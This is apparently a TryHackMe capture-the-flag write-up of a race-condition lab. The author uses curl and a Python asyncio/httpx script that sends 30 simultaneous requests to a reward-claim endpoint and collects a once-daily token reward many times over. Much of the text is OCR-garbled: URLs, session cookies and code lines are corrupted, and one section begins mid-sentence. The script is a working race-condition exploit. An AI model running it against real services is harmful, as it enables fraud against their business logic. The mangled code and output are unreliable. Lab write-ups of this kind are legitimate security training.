# Towel on the Sunbed - TryHackMe Writeup 

_Hacker Holidays 2026, Day 8, The Byte Lotus Hotel_ 

This one's a race condition room. Way shorter than Do Not Disturb but it messed with my head more than I expected because I kept burning my own test accounts without realising it. 

## The idea 

Story is some guy called Ponzi puts his towel down on a sunbed to claim it for 24 hours, comes back and someone's claimed it three times over. Translated into actual app terms: there's a wellness portal with a crypto rewards thing called Ponzi Portfolio. You get a "Claim Reward" button that gives you 50 PONZI tokens, but it's only supposed to work once every 24 hours. Get to 150 PONZI and you unlock something called the Whale Vault. 

So obviously the play here is to try and claim way more than once before the cooldown kicks in. 

## Recon 

Made a guest account, logged into the dashboard. Balance was 0 PONZI, tier was Shrimp, and the reward was available to claim. 



<!-- Start of picture text -->
@) Ponzi Portfolio Logout<br>0 PONZI<br>Market Prices<br>BTC<br>ETH<br>PONZI<br>SOL<br>Staking Rewards<br>Claim Reward<br><!-- End of picture text -->



<!-- Start of picture text -->
SSS<br>Ce O) Inspector G] console [ Debugger PY Network {} Style Editor (]) Performance >> @: Ol] x<br>Ww Filter URL: ll + Q © Disable Cache No Throttling+ ced<br>Al HTML CSS JS XHR Fonts Images Media WS Other<br>Status Met... Domain File Initiator Type = Transferred Size Joms 1024<br>304 GET Gj 10.130.14. ne dashboard.js:.. son cache 2726 || 9ms<br>GET =f 10.130.14...— Favicon.ice ng son cachec 218 || ams<br>POST 8 10.130.14... claim dashboard.js:... json 350B 1148 | 30 ms<br>GET = 10.130.14... me dashboardJs:... json 515B 2786 16 ms<br>fo) Trequests 12.78kB/865Btransferred — Finish:4.30s [J DOMContentLoaded:291ms [ff load: 299 ms<br><!-- End of picture text -->

- Pl Headers Cookies Request Response Timings Stack Trace ‘W Filter Headers Block Resend > POST http;//10.130.141.129:3000/claim Status 200 OK () Version HTTP/1.1 Transferred 350 6 (114 B size) Referrer Policy strict-ongin-when-cross-origin Request Priority Highest DNS Resolution System 

- © Response Headers (236 B) raw CD @) Connection: keep-alive @) Content-Length: 114 @ 2) Conbent-Type: application/json; charset=utf-8 @) Date: Fri,O7 Aug 2026 12:20:17GMT @) ETag: Wy/"72-FawsWDsVt6SP381 1+HTakwdvhHU” (2) Keep-Alive: timeout=5 X-Powered-By: Express 

- © Request Headers (458 B) Raw CD (@) Accept: */* @) Accept-Encoding: gzip, deflate @) AcceptLanguage: en-US,en;q=0.9 (@) Connection: keep-alive (2) Content-Length: 0 (2) Cookie: connect.sid=s%3ABXbZA_vx8bBsgXhflcUHtx_SHTy48RLS.FTbSd0b%2ZBOSkvORBMVMpjhm obdT 1SKXIFNIQ7QH10Mmk 

- @) Host: 10.130.141.129:3000 

- @) Origin: http://10.130.141.129:3000 @) Priority: u=0 @) Referer: httpy/10.130.141.129:3000/dashboard @ User-Agent: Mozilla/5.0 (X11; Linux x86_64; n:152.0) Gecko/20100101 Firefox/152.0 



_30 requests, 30 failures_ 

Turned out the cookie value copied out of dev tools was already URL encoded (stuff like %3A and %2B in it), and httpx was encoding it again on top of that when I passed it through cookies=, so the server got a mangled cookie it didn't recognise. Confirmed this with a plain curl call using the same cookie, also 401. 



_Same cookie, same 401, so the cookie itself was already dead by this point too_ 

Fixed it by setting the raw Cookie header manually instead of using httpx's cookie jar. Also to be honest with myself here, some of the early failures were also me misreading characters out of a screenshot, l and I look identical in some fonts and I typed the wrong one out at one point. Lesson: don't retype cookies by hand, always copy paste. 



<!-- Start of picture text -->
Ge Ob inspector BJ console ( Debugger TL Network {} Style Editor CG) Performance >> oi ah woe XX<br>UW Filter URLs 11 + & = &) [Jdisable Cache No Throttling+ 4<br>All HTML CSS J5 XHR Fonts Images Media WS Other<br>5 h D.. File In. TT... S BO Headers Cookies Request Response Timings Stack Trace<br>31 Gl gf... dashboard dw hte... 2) 4 Filber Cookies<br>3) Gl f . style.css st... os c.. 5. © Request Cookies<br>3°61 fg... dashboardjs 5s... js c.. 4 connect.sid: "s:BXbZA_vx8bBsoaxhFlcUHtx_SHTy48RL5.FTbSd0b+0SkVORBMVMpjhmobdT1SkXIFNIOTQ<br>- F H10Mmk"<br>Gl .. Favicon.ica mg jac... 2<br><!-- End of picture text -->

root@.p-10-130-123-83:-# curl -1 -X POST http://10.130.141.129:3000/claim -H "Cookie: connect.sid=s%3ABXbZA vx8bBsgxXhflcUHtx_8HTy48RLS. fTbSdOb%2BOSkVORB MVMpjhmobdT1SkX LFNLQ7QH10Mmk" 

HTTP/1.1 401 Unauthorized X-Powered-By: Express 

Content-Type: application/json; charset=utf-8 Content-Length: 36 ETag: W/"24-2ya6UNOy8ALxJkjNOyYmjYabP90" Date: Fri, O7 Aug 2026 12:40:16 GMT Connection: keep-alive Keep-Alive: timeout=5 

f"error":"Authentication curl -i -X POST http://10.130.141.129:3000/claim -H "Cookie: connect.sid=s:BXbZA vx8bBsgXhflcUHtx_8HTy48RLS. fTbSdOb+OSkvORBMVMp jhmobdT1SkXIfNLQ7QH10Mmk" 

HTTP/1.1 429 Too Many Requests 

X-Powered-By: Express Content-Type: application/json; charset=utf-8 Content-Length: 95 ETag: W/"Sf-XUVOmiI13aXRtzvE7He7VXOB80q" Date: Fri, O07 Aug 2026 12:43:02 GMT Connection: keep-alive Keep-Alive: timeout=5 

{"error":"Reward already claimed. Please wait before claiming again.","secon dsRemaining" :85035}root@ip-10-130-123-83:~# | 



<!-- Start of picture text -->
pOOtM Lp-10-130-123-83:-8# curl -1 -A POS ttp://10.130.141.129:3000/claim -H<br>"Cookie: connect.sid=s: JNedf jPrloFB8woOvkdhBpOQvZUaxfhm.uScDSIAIr/EKxEX+/jP<br>8OFoLFMUcxagSt LtEKSRBw/4"<br>HTTP/1.1 200 OK<br>X-Powered-By: Express<br>Content-Type: application/json; charset=utf-8<br>Content-Length: 114<br>ETag: W/"72-f8wsWDsVt6SP3811+HTqkwdvhHU"<br>Date: Fri, O7 Aug 2026 12:48:00 GMT<br>Connection: keep-alive<br>Keep-Alive: timeout=5<br>{"message": "Staking reward claimed successfully.","reward":50,"newBalance":5<br>0,"tier":"Shrimp","priceSnapshot":4.2}root@ip-10-130-123-83:-#<br><!-- End of picture text -->

import asyncio import httpx 

URL = "http: //10.130.141.129:3000/claim" SID = " SRZABXDZAyasbRsaXhfLcunity o7gtigvink” SHTy4RRLS- fThSdob™2BoskvoRsMvpihmebaT ASIA LENT. N_REQUESTS = 30 

async def fire_claim(client, i): headers = {"Cookie": F"connect .sid={SID}"} r = await client.post(URL, headers=headers) print(f"[{i}] {r.status_code} - {r.text}") 

async def main(): 

async with httpx.AsyncClient() as client: tasks = [fire_claim(client, i) for i in range(N_REQUESTS)] await asyncio.gather(*tasks) 

asyncio.run(main()) 

cookie and everything. The text editor just hadn't written the changes to disk even though it looked fine on screen. 

Fix for this was to stop trusting the GUI text editor and just write the file straight from the terminal instead using a heredoc, that guarantees the file actually has what you think it has, no editor involved. 

cat > race.py << 'EOF' import asyncio import httpx URL = "http://10.130.141.129:3000/claim" SID = "your_cookie_here" N_REQUESTS = 30 async def fire_claim(client, i): headers = {"Cookie": f"connect.sid={SID}"} r = await client.post(URL, headers=headers) print(f"[{i}] {r.status_code} - {r.text}") async def main(): async with httpx.AsyncClient() as client: tasks = [fire_claim(client, i) for i in range(N_REQUESTS)] await asyncio.gather(*tasks) asyncio.run(main()) EOF 

## The actual win 

Fourth account. Registered it, grabbed the cookie straight away, didn't touch the claim button, didn't test with curl, went straight to writing the script from the terminal and running it. Basically first ever claim on this account was the race attempt itself. 

Ran it with 30 concurrent requests using asyncio.gather so they all fire at once instead of one after another. Output was a big list of responses, most of them came back 200 successfully claimed, and you could actually see the race happening in real time because newBalance was jumping around between different values like 1450 and 1500 depending on which request the server processed in what order. 

root@ip-10-130-123-83:-# cat > race.py << 'EOF' import asyncio import httpx URL = "http: //10.130.141.129:3000/claim" SID = "s:IztPNZGXK34sjL-ZEoz9x6vJ83k2ccNWF .62W311JeHcfsrQAZeGYE8fdIwBcqc/zbU9 DWemkXXzU" N_REQUESTS = 30 async def fire_claim(client, i): headers = {"Cookie": f"connect.sid={SID}"} r = await client.post(URL, headers=headers) print(f"[{i}] {r.status_code} - {r.text}") async def main() async with httpx.AsyncClient() as client: tasks = [fire _claim(client, 1) for 1 in range(N_REQUESTS)] await asyncio.gather(*tasks) 

### asyncio.run(main()) 

EOF 

root@ip-10-130-123-83:~# python3 race.py [3] 200 - {"message":"Staking reward claimed successfully.","reward":50,"new Balance":1450,"tier":"Whale","priceSnapshot":4.2} [1] 200 - {"message":"Staking reward claimed successfully.","reward":50,"new Balance":1450,"tter":"Whale","priceSnapshot":4.2} [19] 200 - {"message":"Staking reward claimed successfully.","reward":50,"ne 

- Python with httpx and asyncio, to fire the concurrent requests for the actual race 

